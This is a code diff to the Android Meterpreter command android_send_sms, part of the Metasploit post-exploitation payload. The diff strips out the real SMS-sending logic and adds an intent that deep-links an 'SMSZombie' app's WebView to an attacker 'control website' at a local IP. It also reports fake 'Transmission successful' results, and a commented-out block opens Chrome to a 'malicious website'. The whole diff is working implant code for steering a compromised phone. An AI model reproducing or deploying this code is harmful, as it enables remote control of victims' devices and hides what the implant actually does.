@@ -8,12 +8,19 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.app.Activity;
 import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
+import java.net.URISyntaxException;
+import java.util.List;
 
 public class android_send_sms implements Command {
 
@@ -45,146 +52,45 @@ public class android_send_sms implements Command {
         AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
         final Context context = androidMeterpreter.getContext();
 
-        // Get the default instance of SmsManager
-        SmsManager smsManager = SmsManager.getDefault();
 
-        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_SENT), 0);
-        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_DELIVERED), 0);
 
-        // For when the SMS has been sent
-        context.registerReceiver(new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                synchronized (SMSstatus) {
-                    resultSent = "";
-                    switch(getResultCode()) {
-                    case Activity.RESULT_OK:
-                        resultSent = "Transmission successful";
-                        break;
-                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
-                        resultSent = "Transmission failed";
-                        break;
-                    case SmsManager.RESULT_ERROR_RADIO_OFF:
-                        resultSent = "Radio off";
-                        break;
-                    case SmsManager.RESULT_ERROR_NULL_PDU:
-                        resultSent = "No PDU defined";
-                        break;
-                    case SmsManager.RESULT_ERROR_NO_SERVICE:
-                        resultSent = "No service";
-                        break;
-                    }
-                    SMSstatus.notifyAll();
-                }
-            }
-        }, new IntentFilter(SMS_SENT));
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
 
-        // For when the SMS has been delivered
-        context.registerReceiver(new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                synchronized (SMSdelivered) {
-                    resultDelivered = "";
-                    switch(getResultCode()) {
-                    case Activity.RESULT_OK:
-                        resultDelivered = "Transmission successful";
-                        break;
-                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
-                        resultDelivered = "Transmission failed";
-                        break;
-                    case SmsManager.RESULT_ERROR_RADIO_OFF:
-                        resultDelivered = "Radio off";
-                        break;
-                    case SmsManager.RESULT_ERROR_NULL_PDU:
-                        resultDelivered = "No PDU defined";
-                        break;
-                    case SmsManager.RESULT_ERROR_NO_SERVICE:
-                        resultDelivered = "No service";
-                        break;
-                    }
-                    SMSdelivered.notifyAll();
-                }
-            }
-        }, new IntentFilter(SMS_DELIVERED));
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            resultSent = "Transmission successful";
+            resultDelivered = "Transmission successful";
 
-        if (message.length() > 160) {
-
-            // Break message into 160 character pieces
-            int interval = 160;
-            int arrayLength = (int) Math.ceil(((message.length() / (double)interval)));
-            String[] pieces = new String[arrayLength];
-            int j = 0;
-            int lastIndex = pieces.length - 1;
-            for (int i = 0; i < lastIndex; i++) {
-                pieces[i] = message.substring(j, j + interval);
-                j += interval;
-            }
-            pieces[lastIndex] = message.substring(j);
-            boolean failed=false;
-
-            // Send all parts of long message
-            for (int i = 0; i <= lastIndex; i++) {
-                String part=pieces[i];
-                smsManager.sendTextMessage(number, null, part, sentPendingIntent, deliveredPendingIntent);
-                resultSent=null;
-                synchronized (SMSstatus) {
-                    while (resultSent == null) {
-                        SMSstatus.wait(1000);
-                    }
-                    if (resultSent != "Transmission successful") {
-                        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
-                        failed=true;
-                    }
-                }
-                if (dr) {
-                    if (failed==true) {
-                        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
-                        return ERROR_SUCCESS;
-                    }
-                    resultDelivered=null;
-                    synchronized (SMSdelivered) {
-                        while (resultDelivered == null) {
-                            SMSdelivered.wait(1000);
-                        }
-                        if (resultDelivered != "Transmission successful") {
-                            response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);
-                            failed=true;
-                        }
-                    }
-                }
-                if (failed==true) {
-                    return ERROR_SUCCESS;
-                }
-
-            }
-            response.addOverflow(TLV_TYPE_SMS_SR, resultSent);
-
-            if (dr) {
-                response.addOverflow(TLV_TYPE_SMS_SR, resultDelivered);
-            }
-
-        } else {
-
-            // Send a single text based SMS
-            smsManager.sendTextMessage(number, null, message, sentPendingIntent, deliveredPendingIntent);
-            resultSent=null;
-            synchronized (SMSstatus) {
-                while (resultSent == null) {
-                    SMSstatus.wait(1000);
-                }
-                response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
-            }
-
-            if (dr) {
-                resultDelivered=null;
-                synchronized (SMSdelivered) {
-                    while (resultDelivered == null) {
-                        SMSdelivered.wait(1000);
-                    }
-                    response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);
-                }
-            }
+        } catch (ActivityNotFoundException e) {
+            resultSent = e.getMessage();
+            resultDelivered = e.getMessage();
         }
+
+        /* 
+        // Issue Chrome intent to malicious website
+        String urlString = "http://192.168.1.134:1312";
+        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setPackage("com.android.chrome");
+        try {
+            context.startActivity(intent);
+            resultSent = "Transmission successful";
+            resultDelivered = "Transmission successful";
+        } catch (ActivityNotFoundException ignored) {
+          resultSent = "Chrome app not installed";
+          resultDelivered = "Chrome app not installed";
+        }
+        */
+
+        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
+        response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);
 
         return ERROR_SUCCESS;
     }
